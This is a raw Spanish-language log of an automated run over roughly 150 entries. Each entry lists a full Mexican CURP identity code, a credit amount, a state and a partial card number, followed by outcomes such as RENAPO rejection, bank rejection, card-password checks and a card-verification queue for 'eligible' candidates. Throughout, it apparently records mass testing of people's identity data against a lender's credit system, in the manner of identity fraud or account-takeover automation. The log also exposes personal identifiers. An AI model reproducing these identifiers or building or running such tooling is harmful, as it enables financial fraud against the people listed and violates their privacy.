[2669] ID:3605208 | BACL700114HJCRRS00 | $172,590 | JALISCO | T:8980... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (13.7s)
[2670] ID:1854065 | GAMJ720617HCPNRR05 | $172,550 | CAMPECHE | T:5236... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (10.8s)
[2671] ID:4128842 | FAPR721213HYCRRD05 | $172,540 | YUCATAN | T:4420... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (12.3s)
[2672] ID:2260812 | OOCF720914HBCRRS05 | $172,530 | BAJA CALIFOR | T:9024... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:8980 para ID:3605208 ($172,590)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (8.7s)
[2673] ID:2078965 | LOVM771024HNLPLN02 | $172,520 | NUEVO LEON | T:9751... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (12.7s)
[2674] ID:3478992 | AARC760913HDFRMR01 | $172,500 | CIUDAD DE ME | T:4891... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.6s)
[2675] ID:1280018 | BAOA790305HBCRLL07 | $172,480 | BAJA CALIFOR | T:7412... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (14.2s)
[2676] ID:1037091 | AAMA010101HSPLBNA2 | $172,460 | SAN LUIS POT | T:7542... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (12.4s)
[2677] ID:2616409 | GAAM000101HVZLLGA9 | $172,460 | VERACRUZ | T:6712... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:7412 para ID:1280018 ($172,480)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (8.8s)
[2678] ID:3648536 | MAPE690818MSPRNS03 | $172,450 | SAN LUIS POT | T:5667... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.1s)
[2679] ID:97977 | GOGE710125HBCNRD03 | $172,420 | BAJA CALIFOR | T:5240... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.9s)
[2680] ID:891062 | SATF710724MQTNLB02 | $172,410 | QUERETARO | T:3892... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Derivación LikeU Pro (/derivation-pro) (14.6s)
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (10.6s)
[2681] ID:1026686 | MOPO690413HMCRNC06 | $172,400 | ESTADO DE ME | T:0556... [2682] ID:3426007 | OOCC741020HCSCLR09 | $172,390 | CHIAPAS | T:5789... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.1s)
[2683] ID:217605 | CAPJ750310HMCRRN04 | $172,360 | ESTADO DE ME | T:8737... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.6s)
[2684] ID:3937709 | NASM700116HYCRNR00 | $172,360 | YUCATAN | T:3267... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (17.2s)
[2685] ID:3378808 | CUCM700108HPLRSR00 | $172,350 | PUEBLA | T:2711... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.4s)
[2686] ID:3568533 | GOCM760904MCHNRY00 | $172,350 | CHIHUAHUA | T:3519... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.1s)
[2687] ID:3301337 | MACL711113HJCRRS06 | $172,320 | JALISCO | T:0973... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (7.7s)
[2688] ID:3378179 | AAGA000101HCCYNBA2 | $172,320 | CAMPECHE | T:3249... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.7s)
[2689] ID:2109760 | DAAL710403HDFGLL05 | $172,260 | CIUDAD DE ME | T:9578... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.0s)
[2690] ID:1012330 | GOAA690629MDFMCN05 | $172,220 | CIUDAD DE ME | T:0845... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.4s)
[2691] ID:1766822 | TABR740309HBSLRM00 | $172,200 | BAJA CALIFOR | T:6525... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.3s)
[2692] ID:1895208 | GOGR740811HSONRB05 | $172,200 | SONORA | T:3248... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.9s)
[2693] ID:48143 | VERO700624MJCGLC02 | $172,180 | JALISCO | T:7883... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:0845 para ID:1012330 ($172,220)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.2s)
[2694] ID:2727493 | GOML710423MMNNRR09 | $172,170 | MICHOACAN | T:0719... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.3s)
[2695] ID:738979 | MARA740102HASCYL04 | $172,110 | AGUASCALIENT | T:7470... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo bancario (PE170) (15.2s)
[2696] ID:2499657 | RIMH721104HVRVRC04 | $172,110 | VERACRUZ | T:9508... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (13.8s)
[2697] ID:3411273 | CABK690307MDFMCR02 | $172,090 | CIUDAD DE ME | T:7843... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:7470 para ID:738979 ($172,110)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.6s)
[2698] ID:3360053 | NUQJ790601HMCNNR09 | $172,080 | ESTADO DE ME | T:1616... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[2699] ID:2154546 | REPD750407MJCYDM03 | $172,060 | JALISCO | T:9184... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.9s)
[2700] ID:2959352 | VAOL701001HPLRLS05 | $172,050 | PUEBLA | T:7102... [🔴 OFF] Contacto preexistente (/confirm-contact) (17.2s)
[2701] ID:2106611 | OIAN700907MNLRGR08 | $172,040 | NUEVO LEON | T:0799... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (13.7s)
[2702] ID:2423817 | RACM691204MBSMTR02 | $172,040 | BAJA CALIFOR | T:1162... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (17.6s)
[2703] ID:1886629 | SAVC730621MJCNRR02 | $172,030 | JALISCO | T:2453... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:7102 para ID:2959352 ($172,050)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.8s)
[2704] ID:847369 | RACM690817MNLMNR03 | $172,020 | NUEVO LEON | T:6614... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (8.3s)
[2705] ID:930375 | TAMJ740515HCHLLM06 | $172,010 | CHIHUAHUA | T:4937... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Contacto preexistente (/confirm-contact) (17.0s)
[2706] ID:563499 | FASA700530HJCVLL05 | $172,000 | JALISCO | T:4371... [🔴 OFF] Contacto preexistente (/confirm-contact) (18.3s)
[2707] ID:607568 | QURG711123MTCNDD04 | $172,000 | TABASCO | T:3507... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.6s)
[2708] ID:976126 | VACX710726HGTLML06 | $172,000 | GUANAJUATO | T:5941... [⚠️ RETRY] Timeout global de verificación (22s) (22.0s)
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.4s)
[2709] ID:984340 | RARF740322HTSMMR00 | $172,000 | TAMAULIPAS | T:7188... [2710] ID:1126296 | CEEJ690606HMNJLS02 | $172,000 | MICHOACAN | T:5291... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.9s)
[2711] ID:1296609 | MOVA830917HDFRLD04 | $172,000 | CIUDAD DE ME | T:4396... [🔴 OFF] Contacto preexistente (/confirm-contact) (16.1s)
[2712] ID:1791858 | AABE730430MQTRRM00 | $172,000 | QUERETARO | T:5778... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.6s)
[2713] ID:1823378 | OIPJ800518MVRLNS02 | $172,000 | VERACRUZ | T:0847... [🔴 OFF] Contacto preexistente (/confirm-contact) (16.7s)
[2714] ID:1867854 | MOBU690815MBCYLC04 | $172,000 | BAJA CALIFOR | T:4003... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.6s)
[2715] ID:1976885 | ROLC690911MSPDRR00 | $172,000 | SAN LUIS POT | T:0790... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.0s)
[2716] ID:2018238 | QUMC720106MMCNRY02 | $172,000 | ESTADO DE ME | T:4005... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.2s)
[2717] ID:2179162 | MEPC700406MMSNRL00 | $172,000 | MORELOS | T:0689... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.6s)
[2718] ID:2213292 | CUFJ700203HDFVLV08 | $172,000 | CIUDAD DE ME | T:7917... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.7s)
[2719] ID:2569834 | AARC760913HDFRMR01 | $172,000 | CIUDAD DE ME | T:2950... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.0s)
[2720] ID:2589635 | OIMO700328HMSRRS01 | $172,000 | MORELOS | T:3443... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.4s)
[2721] ID:2857111 | UITC760722MNLRRY05 | $172,000 | NUEVO LEON | T:5968... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:7917 para ID:2213292 ($172,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.3s)
[2722] ID:3052733 | SALJ740821HBCNNN09 | $172,000 | BAJA CALIFOR | T:0107... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.7s)
[2723] ID:3315113 | VELA720122HBSGNN09 | $172,000 | BAJA CALIFOR | T:4813... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:5968 para ID:2857111 ($172,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.8s)
[2724] ID:3501733 | AUBJ760624HPLBRL00 | $172,000 | PUEBLA | T:5623... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.6s)
[2725] ID:3765725 | FOGL720106HNLLNS08 | $172,000 | NUEVO LEON | T:3549... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.7s)
[2726] ID:3918479 | RABM701111MPLZLR08 | $172,000 | PUEBLA | T:1163... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.4s)
[2727] ID:4120457 | CARV770918MMCHMN02 | $172,000 | ESTADO DE ME | T:1919... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.4s)
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (14.9s)
[2728] ID:4234995 | SAIA691103HMCNNL07 | $172,000 | ESTADO DE ME | T:3667... [2729] ID:4693610 | CAAA720402HMNRLL03 | $172,000 | MICHOACAN | T:0314... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:3549 para ID:3765725 ($172,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.8s)
[2730] ID:1571121 | AAHS750724HMCRRR09 | $171,990 | ESTADO DE ME | T:9825... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.9s)
[2731] ID:1377723 | GAGK781221MDFRLT00 | $171,980 | CIUDAD DE ME | T:0789... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Derivación LikeU Pro (/derivation-pro) (19.0s)
[2732] ID:2490694 | MOOI690117HNLRCS06 | $171,950 | NUEVO LEON | T:3503... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (15.0s)
[2733] ID:2610306 | GARR000101HMCRMLA1 | $171,930 | ESTADO DE ME | T:4615... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.9s)
[2734] ID:3710570 | DIJA740614HMSMRN09 | $171,900 | MORELOS | T:5218... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.5s)
[2735] ID:3826010 | MEQE710223HPLNRR09 | $171,870 | PUEBLA | T:0859... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.7s)
[2736] ID:659576 | VEFS730108MDFLLN06 | $171,840 | CIUDAD DE ME | T:6320... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.2s)
[2737] ID:2227169 | MAMR721231HMNRRB02 | $171,810 | MICHOACAN | T:8894... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.2s)
[2738] ID:3483148 | DICR701212HBCZRC05 | $171,750 | BAJA CALIFOR | T:5344... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (14.8s)
[2739] ID:3727149 | GOHE710308HDFNGD04 | $171,720 | CIUDAD DE ME | T:3262... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:6320 para ID:659576 ($171,840)... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (10.0s)
[2740] ID:3305701 | AUPF690729HSOGRR08 | $171,690 | SINALOA | T:0909... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:8894 para ID:2227169 ($171,810)... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (13.8s)
[2741] ID:4523037 | SATA790203HDFNPR04 | $171,690 | CIUDAD DE ME | T:5365... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.7s)
[2742] ID:162319 | DUAK731221MDFRLR04 | $171,670 | CIUDAD DE ME | T:3326... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Contacto preexistente (/confirm-contact) (15.9s)
[2743] ID:3527519 | FEJC700104MDFRML05 | $171,610 | CIUDAD DE ME | T:0876... [🔴 OFF] Contacto preexistente (/confirm-contact) (13.6s)
[2744] ID:894458 | JUCR690514HTSRHL06 | $171,600 | TAMAULIPAS | T:4602... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.6s)
[2745] ID:1245429 | VAGR730614HSOLXM03 | $171,600 | SINALOA | T:5710... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.6s)
[2746] ID:2579562 | TEML750219HDFRNS03 | $171,600 | CIUDAD DE ME | T:1150... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.9s)
[2747] ID:2589483 | ROLV700718HDFSPC06 | $171,600 | CIUDAD DE ME | T:8259... [🔴 OFF] Rechazo bancario (PE1002) (12.7s)
[2748] ID:3229752 | ROCA740908HPLJRD08 | $171,600 | PUEBLA | T:0346... [🔴 OFF] Contacto preexistente (/confirm-contact) (11.5s)
[2749] ID:1085657 | MOAA810829MMNCVL06 | $171,580 | MICHOACAN | T:0942... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (8.4s)
[2750] ID:1963664 | FOTV690304HJCLRC01 | $171,580 | JALISCO | T:8060... [⚠️ RETRY] Timeout global de verificación (22s) (22.0s)
[2751] ID:206730 | RAGR690322HDFMRM03 | $171,490 | CIUDAD DE ME | T:0293... [🔴 OFF] Contacto preexistente (/confirm-contact) (16.4s)
[2752] ID:920670 | QUML800102HBCJRS00 | $171,490 | BAJA CALIFOR | T:9455... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[2753] ID:4166803 | LUZJ730602HJCNMN00 | $171,490 | JALISCO | T:5126... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (15.5s)
[2754] ID:104367 | AAGO730909MTSLNL02 | $171,450 | TAMAULIPAS | T:6726... [🔴 OFF] Rechazo bancario (PE020) (13.1s)
[2755] ID:4861115 | LARI710711HNLCYV08 | $171,450 | NUEVO LEON | T:2314... [🔴 OFF] Contacto preexistente (/confirm-contact) (13.0s)
[2756] ID:263223 | LEGA700925HDFNLD01 | $171,430 | CIUDAD DE ME | T:4521... [🔴 OFF] Contacto preexistente (/confirm-contact) (12.5s)
[2757] ID:2462404 | VIXD000101MMNLXNA1 | $171,420 | MICHOACAN | T:0806... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.3s)
[2758] ID:3281606 | TEVG791213MGRRGL01 | $171,390 | GUERRERO | T:0459... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.7s)
[2759] ID:3979810 | TEVG791213MGRRGL01 | $171,390 | GUERRERO | T:2196... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (12.6s)
[2760] ID:894391 | JACL701228HTSRRS08 | $171,370 | TAMAULIPAS | T:4972... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (16.2s)
[2761] ID:2118049 | SEHR750625HQTRRD08 | $171,360 | QUERETARO | T:0294... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.5s)
[2762] ID:2495551 | MUMR690408HDFNNC08 | $171,360 | CIUDAD DE ME | T:8529... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (11.0s)
[2763] ID:3083818 | MERG750801MMCNSB02 | $171,350 | ESTADO DE ME | T:8769... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.1s)
[2764] ID:3367270 | GOGV740317MNLMNR06 | $171,340 | NUEVO LEON | T:3400... [🔴 OFF] Contacto preexistente (/confirm-contact) (21.5s)
[2765] ID:3416062 | LAMG760126MDFRNB07 | $171,320 | CIUDAD DE ME | T:1781... [🔴 OFF] Contacto preexistente (/confirm-contact) (13.2s)
[2766] ID:77086 | VAGR730614HSOLXM03 | $171,210 | SINALOA | T:8522... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[2767] ID:4846525 | VIPA720608HNLLRL07 | $171,200 | NUEVO LEON | T:1150... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.3s)

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:1781 para ID:3416062 ($171,320)... [2768] ID:2688039 | FOPM740202HPLLNR04 | $171,170 | PUEBLA | T:9486... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.5s)
[2769] ID:3722180 | EICM690316HBSNSN05 | $171,170 | BAJA CALIFOR | T:7486... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Contacto preexistente (/confirm-contact) (16.2s)
[2770] ID:4092422 | PABR720529HMCRDM06 | $171,160 | ESTADO DE ME | T:4808... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (13.1s)
[2771] ID:4715673 | LAMA730721HCSRLL06 | $171,110 | CHIAPAS | T:6394... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.4s)
[2772] ID:4196522 | LABJ730608HCHLCN02 | $171,100 | CHIHUAHUA | T:9666... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.1s)
[2773] ID:4855053 | SAMJ720216HCSNNN01 | $171,100 | CHIAPAS | T:8259... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (12.0s)
[2774] ID:117542 | MOPE010101HCSRLDA3 | $171,090 | CHIAPAS | T:8683... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:6394 para ID:4715673 ($171,110)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.7s)
[2775] ID:3952158 | NOOG000101HMCGSSA6 | $171,090 | ESTADO DE ME | T:9052... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.8s)
[🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[2776] ID:2912775 | CAPI691102MJCSRL05 | $171,060 | JALISCO | T:6569... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.6s)
[2777] ID:3111532 | GABE771020HMNRRN06 | $171,050 | MICHOACAN | T:9592... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.1s)
[2778] ID:1278833 | MABA701007MDFRRN07 | $171,030 | CIUDAD DE ME | T:2901... [🔴 OFF] Contacto preexistente (/confirm-contact) (15.0s)
[2779] ID:2229376 | MOAG690522HMCRYS06 | $171,010 | ESTADO DE ME | T:2488... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (14.2s)
[2780] ID:992 | MACJ690606HQRNRR02 | $171,000 | QUINTANA ROO | T:5072... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.8s)
[2781] ID:435816 | ZAVN750125HQRPNC05 | $171,000 | QUINTANA ROO | T:7674... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.2s)
[2782] ID:439738 | MESM730204MMCRNN04 | $171,000 | ESTADO DE ME | T:8873... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.6s)
[2783] ID:444278 | CIGR710717HTSSMG00 | $171,000 | TAMAULIPAS | T:5511... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.9s)
[2784] ID:478263 | AOMR701122HDFNSB03 | $171,000 | CIUDAD DE ME | T:2611... [🔴 OFF] Rechazo bancario (PE020) (11.2s)
[2785] ID:536292 | VACX720702HDGLNN04 | $171,000 | DURANGO | T:3489... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (10.3s)
[2786] ID:550014 | MUSF730110HCGZLR06 | $171,000 | COAHUILA | T:2172... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.9s)
[2787] ID:573671 | ROMP690213HJCDDD02 | $171,000 | JALISCO | T:9280... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.4s)
[2788] ID:582073 | GOOI690722MGTNRV00 | $171,000 | LEON DE LOS  | T:8038... [🔴 OFF] Contacto preexistente (/confirm-contact) (15.1s)
[2789] ID:631689 | LOOC690326MDFXCR00 | $171,000 | CIUDAD DE ME | T:6027... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (14.4s)
[2790] ID:829094 | BEGI780830HDFCRS02 | $171,000 | CIUDAD DE ME | T:0664... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.7s)
[2791] ID:912424 | AAHC710827MDFLNY07 | $171,000 | CIUDAD DE ME | T:2926... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.1s)
[2792] ID:917652 | MASL730107HJCRNN02 | $171,000 | JALISCO | T:5891... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (12.7s)
[2793] ID:948758 | MIRR770412HYCLDC03 | $171,000 | YUCATAN | T:7952... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (14.7s)
[2794] ID:1017080 | CURA700826HTSRSL00 | $171,000 | TAMAULIPAS | T:8881... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.1s)
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.7s)

[+] Lote de 500 candidatos precargados con límite >= $50,000 (1969+)
[2795] ID:1082218 | MAAC730907HDFZRH05 | $171,000 | CIUDAD DE ME | T:5495... [2796] ID:1278752 | RIRO710507HDFVMS06 | $171,000 | CIUDAD DE ME | T:0938... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.7s)
[2797] ID:1516086 | CARJ720825HGTHDV03 | $171,000 | GUANAJUATO | T:8212... [🔴 OFF] Rechazo bancario (PE110) (14.3s)
[2798] ID:1849003 | LECO710528HDFZLV02 | $171,000 | CIUDAD DE ME | T:8693... [🔴 OFF] Contacto preexistente (/confirm-contact) (16.5s)
[2799] ID:2096701 | PEQC710609MCHRNL07 | $171,000 | CHIHUAHUA | T:8270... [🔴 OFF] Rechazo bancario (PE1002) (14.1s)
[2800] ID:2561419 | PESA740819HDFNHL08 | $171,000 | CIUDAD DE ME | T:1138... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.2s)
[2801] ID:2734947 | EOCA740407HTSSSL00 | $171,000 | TAMAULIPAS | T:7917... [🔴 OFF] Contacto preexistente (/confirm-contact) (13.0s)
[2802] ID:2899156 | EIGT710430MCGLNR04 | $171,000 | COAHUILA | T:5366... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.0s)
[2803] ID:3239134 | CARC761012HDFHMR06 | $171,000 | CIUDAD DE ME | T:8552... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.8s)
[2804] ID:3276406 | MOBG731031MJCRRD03 | $171,000 | JALISCO | T:7310... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (12.4s)
[2805] ID:3390046 | RERD780411HDFYYV02 | $171,000 | CIUDAD DE ME | T:4477... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.7s)
[2806] ID:3502751 | MAGJ750702HCHCNS04 | $171,000 | CHIHUAHUA | T:1878... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:8552 para ID:3239134 ($171,000)... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Derivación LikeU Pro (/derivation-pro) (13.1s)
[2807] ID:3541340 | PEJG750313HNLNRR03 | $171,000 | NUEVO LEON | T:8341... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:7310 para ID:3276406 ($171,000)... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (16.3s)
[2808] ID:3550036 | IEGR690319HDFZTC04 | $171,000 | CIUDAD DE ME | T:9155... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (7.8s)
[2809] ID:3668787 | GOSE691011MQTMLR08 | $171,000 | QUERETARO | T:1517... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[2810] ID:3814894 | RASP750929HCGMCD06 | $171,000 | COAHUILA | T:1834... [🔴 OFF] Rechazo bancario (PE1002) (12.5s)
[2811] ID:4006102 | ROOC730109HMCDSR05 | $171,000 | ESTADO DE ME | T:9861... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.7s)
[2812] ID:4378864 | RABC730718HMCMRR06 | $171,000 | ESTADO DE ME | T:2544... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.0s)
[2813] ID:4501648 | JAVR761020HMCRLY07 | $171,000 | ESTADO DE ME | T:9879... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:2544 para ID:4378864 ($171,000)... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (14.2s)
[2814] ID:4504275 | RACJ720327HCGMSN08 | $171,000 | COAHUILA | T:1847... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.0s)
[2815] ID:4546288 | PEMM691028MTSNRR06 | $171,000 | TAMAULIPAS | T:7133... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.8s)
[2816] ID:4770135 | GUPL701204HDFDZS03 | $171,000 | CIUDAD DE ME | T:6977... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.2s)
[2817] ID:4770785 | CAMN690205MBSSRR01 | $171,000 | BAJA CALIFOR | T:5825... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Contacto preexistente (/confirm-contact) (13.3s)
[2818] ID:1951638 | MAVJ741225HMCRLS05 | $170,880 | ESTADO DE ME | T:2869... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.2s)
[2819] ID:2611575 | SACJ690506HNLLSV01 | $170,880 | NUEVO LEON | T:6890... [🔴 OFF] Contacto preexistente (/confirm-contact) (16.7s)
[2820] ID:3760451 | GUCC690415HJCZRR06 | $170,850 | JALISCO | T:6803... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.3s)
[2821] ID:1592278 | SARL750315HQTNMS09 | $170,820 | QUERETARO | T:0937... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.7s)
[2822] ID:1778797 | AOSG740216HBCTNR04 | $170,820 | BAJA CALIFOR | T:1992... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.8s)
[2823] ID:2190237 | JIAA690904HVRMRR02 | $170,820 | VERACRUZ | T:3717... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.0s)
[2824] ID:2983102 | HENJ690509HNLRVS08 | $170,820 | NUEVO LEON | T:3092... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.6s)
